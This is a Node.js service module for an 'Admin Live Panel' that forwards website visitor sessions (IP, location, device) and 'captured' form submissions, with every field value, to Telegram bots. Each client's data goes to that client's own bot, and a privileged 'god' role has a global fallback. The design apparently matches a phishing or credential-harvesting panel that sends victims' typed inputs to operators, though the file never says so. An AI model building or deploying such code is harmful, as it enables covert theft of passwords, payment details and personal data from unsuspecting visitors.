const { getAdapter } = require('../database/adapter');
const config = require('../config/default');

class TelegramService {
  constructor() {
    this.bot = null;
    this.isRunning = false;
  }

  /**
   * Initialize the Telegram bot if a valid token exists in the DB config.
   * Safe to call multiple times — will stop existing bot first.
   */
  async initialize() {
    try {
      const cfg = await this.getConfig();
      if (cfg && cfg.bot_token && cfg.is_active) {
        await this._startBot(cfg.bot_token);
      }
    } catch (err) {
      console.error('⚠️  Telegram initialization failed (non-fatal):', err.message);
    }
  }

  /**
   * Start the bot with polling. Stops any existing instance first.
   */
  async _startBot(token) {
    await this.stop();

    try {
      const TelegramBot = require('node-telegram-bot-api');
      this.bot = new TelegramBot(token, {
        polling: {
          interval: config.telegram?.pollingInterval || 1000,
          autoStart: true
        }
      });

      // Suppress polling errors to prevent crashes
      this.bot.on('polling_error', (err) => {
        console.error('⚠️  Telegram polling error:', err.message);
      });

      this.bot.on('error', (err) => {
        console.error('⚠️  Telegram bot error:', err.message);
      });

      this.isRunning = true;
      console.log('✅ Telegram bot started');
    } catch (err) {
      console.error('⚠️  Failed to start Telegram bot:', err.message);
      this.bot = null;
      this.isRunning = false;
    }
  }

  /**
   * Raw HTML send to any chat_id using the shared panel bot. Used by the
   * notification service to mirror high/critical events to each user's own
   * telegram_chat_id (independent of the panel-wide sendAlert flow).
   * Returns true on success, false when no bot / no chat_id / API error.
   */
  async sendMessage(chatId, html, options = {}) {
    try {
      if (!chatId || !this.bot) return false;
      await this.bot.sendMessage(chatId, html, { parse_mode: 'HTML', ...options });
      return true;
    } catch (err) {
      // Common: chat blocked bot / invalid chat_id — log once, don't crash caller
      console.error('⚠️  Telegram sendMessage failed:', err.message);
      return false;
    }
  }

  /**
   * Send a formatted HTML alert message to the configured chat.
   */
  async sendAlert(title, message) {
    try {
      const cfg = await this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.chat_id) return false;

      const html = `<b>🔔 ${this._escapeHtml(title)}</b>\n\n${message}`;

      if (this.bot) {
        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
      }
      return true;
    } catch (err) {
      console.error('⚠️  Telegram sendAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Route an HTML message to the WEBSITE'S OWN bot when configured, so each
   * user's captured data only reaches their own Telegram. Falls back to the
   * global bot only when the caller is a god-owned website (i.e. legacy data
   * that predates the per-user model) — never leaks a client's data to god's
   * global bot.
   *
   * `notifyFlag` names a per-website toggle we DO NOT store yet (we honor
   * the global equivalent for now); safe default is "send".
   */
  async _sendForWebsite(website, html) {
    if (!website) return false;
    // Per-website bot present + active — send there and stop.
    if (website.tg_bot_token && website.tg_chat_id && website.tg_bot_active) {
      try {
        const tgBotManager = require('./tgBotManager');
        // Ensure the bot is running; startBot is a no-op if it already is.
        try { await tgBotManager.startBot(website.id); } catch {}
        const ok = await tgBotManager.sendToSite(website.id, website.tg_chat_id, html);
        if (ok) return true;
      } catch (err) {
        console.error('⚠️  per-site Telegram send failed:', err.message);
      }
    }
    // Fallback: only for websites owned by a god user. Non-god websites stay
    // silent if the owner hasn't set up their own bot — never leak to god's
    // global bot.
    try {
      const { getAdapter } = require('../database/adapter');
      const db = getAdapter();
      const owner = await db.get('SELECT role FROM users WHERE id = ?', [website.owner_id]);
      if (!owner || owner.role !== 'god') return false;
    } catch { return false; }

    try {
      const cfg = await this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.chat_id) return false;
      if (this.bot) await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
      return true;
    } catch (err) {
      console.error('⚠️  global Telegram fallback send failed:', err.message);
      return false;
    }
  }

  /**
   * Format and send a new session alert to the website's owner.
   */
  async sendSessionAlert(session, website = null) {
    try {
      // Load the website if not passed in — every session has website_id.
      if (!website && session && session.website_id) {
        const { getAdapter } = require('../database/adapter');
        website = await getAdapter().get('SELECT * FROM websites WHERE id = ?', [session.website_id]);
      }
      if (!website) return false;

      const lines = [
        `<b>👤 New Visitor Session</b>`,
        ``,
        `🌐 <b>Site:</b> ${this._escapeHtml(website.name || 'Unknown')}`,
        `📄 <b>Page:</b> ${this._escapeHtml(session.current_page || 'Unknown')}`,
        `🔗 <b>Referrer:</b> ${this._escapeHtml(session.referrer || 'Direct')}`,
        `💻 <b>Browser:</b> ${this._escapeHtml(session.browser || 'Unknown')}`,
        `🖥️ <b>OS:</b> ${this._escapeHtml(session.os || 'Unknown')}`,
        `📱 <b>Device:</b> ${this._escapeHtml(session.device || 'Unknown')}`,
        `🌍 <b>Location:</b> ${this._escapeHtml(session.city || '')}${session.city && session.country ? ', ' : ''}${this._escapeHtml(session.country || 'Unknown')}`,
        `🔑 <b>IP:</b> <code>${this._escapeHtml(session.ip_address || 'Unknown')}</code>`,
        `🆔 <b>Session:</b> <code>${this._escapeHtml(session.id || '')}</code>`
      ];
      return await this._sendForWebsite(website, lines.join('\n'));
    } catch (err) {
      console.error('⚠️  Telegram sendSessionAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Format and send a form data submission alert to the website's owner.
   */
  async sendFormDataAlert(data, website) {
    try {
      if (!website) return false;

      const lines = [
        `<b>📝 Form Data Captured</b>`,
        ``,
        `🌐 <b>Website:</b> ${this._escapeHtml(website.name || 'Unknown')}`,
        `📄 <b>Page:</b> ${this._escapeHtml(data.page || 'Unknown')}`,
        ``
      ];

      if (data.fields && typeof data.fields === 'object') {
        lines.push(`<b>📋 Fields:</b>`);
        for (const [key, value] of Object.entries(data.fields)) {
          lines.push(`  • <b>${this._escapeHtml(key)}:</b> ${this._escapeHtml(String(value))}`);
        }
      } else if (data.formData && typeof data.formData === 'object') {
        lines.push(`<b>📋 Fields:</b>`);
        for (const [key, value] of Object.entries(data.formData)) {
          lines.push(`  • <b>${this._escapeHtml(key)}:</b> ${this._escapeHtml(String(value))}`);
        }
      }
      return await this._sendForWebsite(website, lines.join('\n'));
    } catch (err) {
      console.error('⚠️  Telegram sendFormDataAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Send an error notification.
   */
  async sendErrorAlert(error) {
    try {
      const cfg = await this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.notify_errors || !cfg.chat_id) return false;

      const errorMsg = typeof error === 'string' ? error : (error.message || JSON.stringify(error));
      const stack = error.stack ? `\n\n<pre>${this._escapeHtml(error.stack.substring(0, 500))}</pre>` : '';

      const lines = [
        `<b>🚨 Error Alert</b>`,
        ``,
        `<b>Message:</b> ${this._escapeHtml(errorMsg)}`,
        `⏰ <b>Time:</b> ${new Date().toISOString()}`,
        stack
      ];

      const html = lines.join('\n');

      if (this.bot) {
        await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
      }
      return true;
    } catch (err) {
      console.error('⚠️  Telegram sendErrorAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Get current Telegram config from the database.
   */
  async getConfig() {
    try {
      const db = getAdapter();
      const row = await db.get('SELECT * FROM telegram_config WHERE id = 1');
      return row || null;
    } catch (err) {
      console.error('⚠️  Failed to get Telegram config:', err.message);
      return null;
    }
  }

  /**
   * Update Telegram config in the database, restart bot if token changed.
   */
  async updateConfig(newConfig) {
    try {
      const db = getAdapter();
      const current = await this.getConfig();

      await db.run(`
        UPDATE telegram_config SET
          bot_token = ?,
          chat_id = ?,
          is_active = ?,
          notify_new_session = ?,
          notify_form_data = ?,
          notify_errors = ?,
          notify_page_views = ?
        WHERE id = 1
      `, [
        newConfig.bot_token ?? current?.bot_token ?? '',
        newConfig.chat_id ?? current?.chat_id ?? '',
        newConfig.is_active ?? current?.is_active ?? 0,
        newConfig.notify_new_session ?? current?.notify_new_session ?? 1,
        newConfig.notify_form_data ?? current?.notify_form_data ?? 1,
        newConfig.notify_errors ?? current?.notify_errors ?? 1,
        newConfig.notify_page_views ?? current?.notify_page_views ?? 0
      ]);

      const tokenChanged = newConfig.bot_token !== undefined && newConfig.bot_token !== current?.bot_token;
      const activeChanged = newConfig.is_active !== undefined && newConfig.is_active !== current?.is_active;

      if (tokenChanged || activeChanged) {
        const updatedCfg = await this.getConfig();
        if (updatedCfg && updatedCfg.is_active && updatedCfg.bot_token) {
          await this._startBot(updatedCfg.bot_token);
        } else {
          await this.stop();
        }
      }

      return true;
    } catch (err) {
      console.error('⚠️  Failed to update Telegram config:', err.message);
      return false;
    }
  }

  /**
   * Send a test message to verify the connection works.
   */
  async testConnection() {
    try {
      const cfg = await this.getConfig();
      if (!cfg || !cfg.bot_token || !cfg.chat_id) {
        return { success: false, error: 'Bot token and chat ID are required' };
      }

      const msg = [
        `<b>✅ ALP Connection Test</b>`,
        ``,
        `🎉 Admin Live Panel is successfully connected!`,
        `⏰ <b>Time:</b> ${new Date().toISOString()}`,
        ``,
        `<i>This is a test message from your Admin Live Panel.</i>`
      ].join('\n');

      let testBot = this.bot;
      let isTemp = false;

      if (!testBot) {
        const TelegramBot = require('node-telegram-bot-api');
        testBot = new TelegramBot(cfg.bot_token, { polling: false });
        isTemp = true;
      }

      await testBot.sendMessage(cfg.chat_id, msg, { parse_mode: 'HTML' });

      if (isTemp) {
        testBot = null;
      }

      return { success: true };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }

  /**
   * Stop the bot polling gracefully.
   */
  async stop() {
    if (this.bot) {
      try {
        await this.bot.stopPolling();
      } catch (err) {}
      this.bot = null;
      this.isRunning = false;
      console.log('🔴 Telegram bot stopped');
    }
  }

  _escapeHtml(text) {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }
}

const telegramService = new TelegramService();
module.exports = telegramService;
